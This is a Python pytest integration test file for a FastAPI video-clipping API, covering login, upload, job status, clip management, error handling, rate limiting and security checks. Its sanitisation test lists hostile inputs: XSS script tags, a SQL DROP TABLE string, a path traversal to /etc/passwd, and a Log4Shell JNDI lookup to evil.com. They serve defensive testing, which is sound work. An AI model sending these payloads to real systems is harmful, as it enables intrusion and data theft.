import pytest
import json
import time
from unittest.mock import Mock, patch, AsyncMock
from fastapi.testclient import TestClient
from api.main import app

class TestCompleteAPIWorkflow:
    """Test complete API workflow integration across multiple endpoints."""
    
    @patch('api.services.supabase_service.supabase_service')
    @patch('api.tasks.process_video_task')
    def test_end_to_end_video_to_clips_workflow(self, mock_task, mock_supabase, client, valid_video_file):
        """Test complete workflow from video upload to clip generation and management."""
        # Mock Supabase service
        mock_supabase_instance = Mock()
        
        # Mock user authentication
        user_data = {"id": "user-123", "email": "test@example.com"}
        mock_supabase_instance.get_user_from_token.return_value = user_data
        mock_supabase_instance.authenticate_user.return_value = {
            "access_token": "test-token-123",
            "user": user_data
        }
        
        # Mock job creation and processing
        job_id = "job-456"
        mock_supabase_instance.create_job.return_value = job_id
        mock_supabase_instance.get_job.return_value = {
            "id": job_id,
            "status": "completed",
            "progress": 100,
            "user_id": "user-123",
            "file_path": "/videos/test-video.mp4"
        }
        
        # Mock clip generation
        generated_clips = [
            {
                "id": "clip-001",
                "title": "Viral Moment 1",
                "start_time": 10.0,
                "end_time": 25.0,
                "score": 0.95,
                "transcript": "Amazing content!",
                "user_id": "user-123",
                "job_id": job_id
            },
            {
                "id": "clip-002",
                "title": "Viral Moment 2",
                "start_time": 45.0,
                "end_time": 60.0,
                "score": 0.88,
                "transcript": "Great moment!",
                "user_id": "user-123",
                "job_id": job_id
            }
        ]
        
        mock_supabase_instance.create_clips_batch.return_value = generated_clips
        mock_supabase_instance.get_clips_by_job.return_value = generated_clips
        mock_supabase_instance.get_clip.return_value = generated_clips[0]
        mock_supabase_instance.update_clip.return_value = {**generated_clips[0], "title": "Updated Title"}
        mock_supabase_instance.delete_clip.return_value = True
        
        # Mock Celery task
        mock_result = Mock()
        mock_result.id = "task-789"
        mock_task.delay.return_value = mock_result
        
        mock_supabase.return_value = mock_supabase_instance
        
        filename, content, content_type = valid_video_file
        
        with patch('api.main.supabase_service', mock_supabase_instance):
            # Step 1: User authentication
            login_response = client.post(
                "/api/auth/login",
                json={
                    "email": "test@example.com",
                    "password": "SecurePassword123!"
                }
            )
            
            assert login_response.status_code == 200
            auth_token = login_response.json()["access_token"]
            auth_headers = {"Authorization": f"Bearer {auth_token}"}
            
            # Step 2: Upload video for processing
            upload_response = client.post(
                "/api/videos/upload",
                files={"file": (filename, content, content_type)},
                data={"user_id": "user-123"},
                headers=auth_headers
            )
            
            assert upload_response.status_code == 200
            upload_data = upload_response.json()
            assert upload_data["job_id"] == job_id
            
            # Step 3: Monitor job progress
            status_response = client.get(
                f"/api/jobs/{job_id}/status",
                headers=auth_headers
            )
            
            assert status_response.status_code == 200
            status_data = status_response.json()
            assert status_data["status"] == "completed"
            
            # Step 4: Generate clips from processed video
            generate_response = client.post(
                "/api/clips/generate",
                json={
                    "job_id": job_id,
                    "min_score": 0.8,
                    "max_clips": 5
                },
                headers=auth_headers
            )
            
            assert generate_response.status_code == 202
            
            # Step 5: Retrieve generated clips
            clips_response = client.get(
                f"/api/clips/?job_id={job_id}",
                headers=auth_headers
            )
            
            assert clips_response.status_code == 200
            clips_data = clips_response.json()
            assert len(clips_data["clips"]) == 2
            
            clip_id = clips_data["clips"][0]["id"]
            
            # Step 6: Get specific clip details
            clip_response = client.get(
                f"/api/clips/{clip_id}",
                headers=auth_headers
            )
            
            assert clip_response.status_code == 200
            clip_data = clip_response.json()
            assert clip_data["id"] == clip_id
            
            # Step 7: Update clip metadata
            update_response = client.put(
                f"/api/clips/{clip_id}",
                json={"title": "Updated Title"},
                headers=auth_headers
            )
            
            assert update_response.status_code == 200
            updated_clip = update_response.json()
            assert updated_clip["title"] == "Updated Title"
            
            # Step 8: Get clips summary
            mock_supabase_instance.get_clips_summary.return_value = {
                "total_clips": 2,
                "average_score": 0.915,
                "top_performing_clips": generated_clips[:1]
            }
            
            summary_response = client.get(
                "/api/clips/summary/overview",
                headers=auth_headers
            )
            
            assert summary_response.status_code == 200
            summary_data = summary_response.json()
            assert summary_data["total_clips"] == 2
            
            # Step 9: Delete a clip
            delete_response = client.delete(
                f"/api/clips/{clip_id}",
                headers=auth_headers
            )
            
            assert delete_response.status_code == 200
    
    @patch('api.services.supabase_service.supabase_service')
    @patch('api.tasks.process_url_task')
    def test_url_processing_to_clips_workflow(self, mock_task, mock_supabase, client):
        """Test complete workflow from URL processing to clip generation."""
        # Mock Supabase service
        mock_supabase_instance = Mock()
        
        # Mock user authentication
        user_data = {"id": "user-456", "email": "user2@example.com"}
        mock_supabase_instance.get_user_from_token.return_value = user_data
        mock_supabase_instance.authenticate_user.return_value = {
            "access_token": "test-token-456",
            "user": user_data
        }
        
        # Mock URL job processing
        job_id = "url-job-789"
        mock_supabase_instance.create_job.return_value = job_id
        mock_supabase_instance.get_job.return_value = {
            "id": job_id,
            "status": "completed",
            "progress": 100,
            "user_id": "user-456",
            "source_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            "file_path": "/videos/downloaded-video.mp4"
        }
        
        # Mock Celery task
        mock_result = Mock()
        mock_result.id = "url-task-123"
        mock_task.delay.return_value = mock_result
        
        mock_supabase.return_value = mock_supabase_instance
        
        with patch('api.main.supabase_service', mock_supabase_instance):
            # Step 1: User authentication
            login_response = client.post(
                "/api/auth/login",
                json={
                    "email": "user2@example.com",
                    "password": "SecurePassword456!"
                }
            )
            
            assert login_response.status_code == 200
            auth_token = login_response.json()["access_token"]
            auth_headers = {"Authorization": f"Bearer {auth_token}"}
            
            # Step 2: Submit URL for processing
            url_response = client.post(
                "/api/process-url",
                json={
                    "url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
                    "user_id": "user-456"
                },
                headers=auth_headers
            )
            
            assert url_response.status_code == 200
            url_data = url_response.json()
            assert url_data["job_id"] == job_id
            
            # Step 3: Monitor processing status
            status_response = client.get(
                f"/api/jobs/{job_id}/status",
                headers=auth_headers
            )
            
            assert status_response.status_code == 200
            status_data = status_response.json()
            assert status_data["status"] == "completed"
            
            # Step 4: Generate clips from processed URL
            generate_response = client.post(
                "/api/clips/generate",
                json={
                    "job_id": job_id,
                    "min_score": 0.7,
                    "max_clips": 3
                },
                headers=auth_headers
            )
            
            assert generate_response.status_code == 202
            
            # Verify task was called
            mock_task.delay.assert_called_once()

class TestAPIErrorHandlingWorkflow:
    """Test API error handling across multiple endpoints."""
    
    def test_authentication_error_propagation(self, client):
        """Test how authentication errors propagate across different endpoints."""
        # Test endpoints that require authentication
        protected_endpoints = [
            ("GET", "/api/auth/me"),
            ("POST", "/api/auth/logout"),
            ("GET", "/api/clips/"),
            ("POST", "/api/clips/"),
            ("GET", "/api/clips/summary/overview"),
            ("POST", "/api/clips/generate"),
            ("GET", "/api/jobs/job-123/status")
        ]
        
        for method, endpoint in protected_endpoints:
            # Test without token
            if method == "GET":
                response = client.get(endpoint)
            elif method == "POST":
                response = client.post(endpoint, json={})
            
            assert response.status_code == 401, f"Endpoint {method} {endpoint} should return 401 without auth"
            
            # Test with invalid token
            headers = {"Authorization": "Bearer invalid-token"}
            if method == "GET":
                response = client.get(endpoint, headers=headers)
            elif method == "POST":
                response = client.post(endpoint, json={}, headers=headers)
            
            assert response.status_code == 401, f"Endpoint {method} {endpoint} should return 401 with invalid token"
    
    @patch('api.services.supabase_service.supabase_service')
    def test_database_error_propagation(self, mock_supabase, client, auth_headers):
        """Test how database errors propagate across different endpoints."""
        # Mock Supabase service to fail
        mock_supabase_instance = Mock()
        mock_supabase_instance.get_user_from_token.return_value = {
            "id": "user-123",
            "email": "test@example.com"
        }
        
        # Mock database failures
        mock_supabase_instance.get_clips.side_effect = Exception("Database connection failed")
        mock_supabase_instance.get_job.side_effect = Exception("Database timeout")
        mock_supabase_instance.create_clip.side_effect = Exception("Database constraint violation")
        
        mock_supabase.return_value = mock_supabase_instance
        
        with patch('api.main.supabase_service', mock_supabase_instance):
            # Test clips endpoint
            clips_response = client.get("/api/clips/", headers=auth_headers)
            assert clips_response.status_code == 500
            
            # Test jobs endpoint
            job_response = client.get("/api/jobs/job-123/status", headers=auth_headers)
            assert job_response.status_code == 500
            
            # Test clip creation
            create_response = client.post(
                "/api/clips/",
                json={
                    "title": "Test Clip",
                    "start_time": 10.0,
                    "end_time": 20.0,
                    "job_id": "job-123"
                },
                headers=auth_headers
            )
            assert create_response.status_code == 500
    
    def test_validation_error_consistency(self, client, auth_headers):
        """Test that validation errors are consistent across endpoints."""
        # Test invalid data formats across different endpoints
        invalid_requests = [
            # Invalid clip data
            {
                "endpoint": "/api/clips/",
                "method": "POST",
                "data": {"title": "", "start_time": "invalid"},
                "expected_status": 422
            },
            # Invalid URL data
            {
                "endpoint": "/api/process-url",
                "method": "POST",
                "data": {"url": "not-a-url", "user_id": ""},
                "expected_status": 422
            },
            # Invalid auth data
            {
                "endpoint": "/api/auth/login",
                "method": "POST",
                "data": {"email": "not-an-email", "password": ""},
                "expected_status": 422
            }
        ]
        
        for request in invalid_requests:
            if request["method"] == "POST":
                if request["endpoint"].startswith("/api/auth"):
                    response = client.post(request["endpoint"], json=request["data"])
                else:
                    response = client.post(request["endpoint"], json=request["data"], headers=auth_headers)
            
            assert response.status_code == request["expected_status"]
            
            # Verify error response structure
            error_data = response.json()
            assert "detail" in error_data

class TestAPIPerformanceWorkflow:
    """Test API performance across multiple endpoints."""
    
    @patch('api.services.supabase_service.supabase_service')
    def test_concurrent_requests_workflow(self, mock_supabase, client, auth_headers):
        """Test handling of concurrent requests across different endpoints."""
        import threading
        import queue
        
        # Mock Supabase service
        mock_supabase_instance = Mock()
        mock_supabase_instance.get_user_from_token.return_value = {
            "id": "user-123",
            "email": "test@example.com"
        }
        mock_supabase_instance.get_clips.return_value = {
            "clips": [],
            "total": 0,
            "page": 1,
            "per_page": 10
        }
        mock_supabase_instance.get_job.return_value = {
            "id": "job-123",
            "status": "processing",
            "progress": 50
        }
        mock_supabase.return_value = mock_supabase_instance
        
        results = queue.Queue()
        
        def make_request(endpoint, request_id):
            """Make request in separate thread."""
            try:
                start_time = time.time()
                response = client.get(endpoint, headers=auth_headers)
                end_time = time.time()
                
                results.put({
                    "request_id": request_id,
                    "endpoint": endpoint,
                    "status_code": response.status_code,
                    "response_time": end_time - start_time
                })
            except Exception as e:
                results.put({
                    "request_id": request_id,
                    "endpoint": endpoint,
                    "error": str(e)
                })
        
        with patch('api.main.supabase_service', mock_supabase_instance):
            # Start concurrent requests to different endpoints
            endpoints = [
                "/api/clips/",
                "/api/jobs/job-123/status",
                "/api/clips/summary/overview",
                "/api/auth/me",
                "/api/health"
            ]
            
            threads = []
            for i, endpoint in enumerate(endpoints * 3):  # 15 total requests
                thread = threading.Thread(target=make_request, args=(endpoint, i))
                threads.append(thread)
                thread.start()
            
            # Wait for all requests to complete
            for thread in threads:
                thread.join(timeout=30)
            
            # Collect results
            request_results = []
            while not results.empty():
                request_results.append(results.get())
            
            assert len(request_results) == 15
            
            # Verify most requests succeeded
            successful_requests = [r for r in request_results if r.get("status_code") == 200]
            assert len(successful_requests) >= 10  # At least 2/3 should succeed
            
            # Verify reasonable response times
            response_times = [r["response_time"] for r in successful_requests if "response_time" in r]
            if response_times:
                avg_response_time = sum(response_times) / len(response_times)
                assert avg_response_time < 5.0  # Should be under 5 seconds
    
    def test_rate_limiting_across_endpoints(self, client, auth_headers):
        """Test rate limiting behavior across different endpoints."""
        # Make rapid requests to different endpoints
        endpoints = [
            "/api/health",
            "/api/auth/me",
            "/api/clips/"
        ]
        
        all_responses = []
        
        for endpoint in endpoints:
            endpoint_responses = []
            for i in range(10):
                if endpoint == "/api/health":
                    response = client.get(endpoint)
                else:
                    response = client.get(endpoint, headers=auth_headers)
                
                endpoint_responses.append(response.status_code)
                time.sleep(0.1)  # Small delay between requests
            
            all_responses.extend(endpoint_responses)
        
        # Should have some rate limiting
        rate_limited = [status for status in all_responses if status == 429]
        successful = [status for status in all_responses if status == 200]
        
        # Should have both successful and rate-limited requests
        assert len(successful) > 0
        assert len(rate_limited) > 0 or len(successful) < len(all_responses)

class TestAPISecurityWorkflow:
    """Test API security across multiple endpoints."""
    
    def test_input_sanitization_across_endpoints(self, client, auth_headers):
        """Test input sanitization across different API endpoints."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE clips; --",
            "../../../etc/passwd",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            # Test clip creation
            clip_response = client.post(
                "/api/clips/",
                json={
                    "title": malicious_input,
                    "description": malicious_input,
                    "start_time": 10.0,
                    "end_time": 20.0,
                    "job_id": "job-123"
                },
                headers=auth_headers
            )
            
            # Should either reject or sanitize
            if clip_response.status_code == 200:
                response_text = clip_response.text.lower()
                assert "<script>" not in response_text
                assert "drop table" not in response_text
                assert "javascript:" not in response_text
            else:
                assert clip_response.status_code in [400, 422]
            
            # Test URL processing
            url_response = client.post(
                "/api/process-url",
                json={
                    "url": f"https://example.com?q={malicious_input}",
                    "user_id": malicious_input
                },
                headers=auth_headers
            )
            
            # Should either reject or sanitize
            if url_response.status_code == 200:
                response_text = url_response.text.lower()
                assert "<script>" not in response_text
                assert "drop table" not in response_text
            else:
                assert url_response.status_code in [400, 422]
    
    def test_cors_and_security_headers(self, client):
        """Test CORS and security headers across endpoints."""
        endpoints = [
            "/api/health",
            "/api/auth/login",
            "/api/clips/"
        ]
        
        for endpoint in endpoints:
            # Test OPTIONS request for CORS
            options_response = client.options(endpoint)
            
            # Should handle OPTIONS requests
            assert options_response.status_code in [200, 405]
            
            # Test regular request for security headers
            if endpoint == "/api/health":
                response = client.get(endpoint)
            elif endpoint == "/api/auth/login":
                response = client.post(endpoint, json={"email": "test@example.com", "password": "password"})
            else:
                response = client.get(endpoint)
            
            # Check for security headers (if implemented)
            headers = response.headers
            
            # These headers might be present depending on middleware configuration
            security_headers = [
                "x-content-type-options",
                "x-frame-options",
                "x-xss-protection",
                "strict-transport-security"
            ]
            
            # At least some security headers should be present
            present_headers = [header for header in security_headers if header in headers]
            # Note: This is informational - not all headers may be implemented yet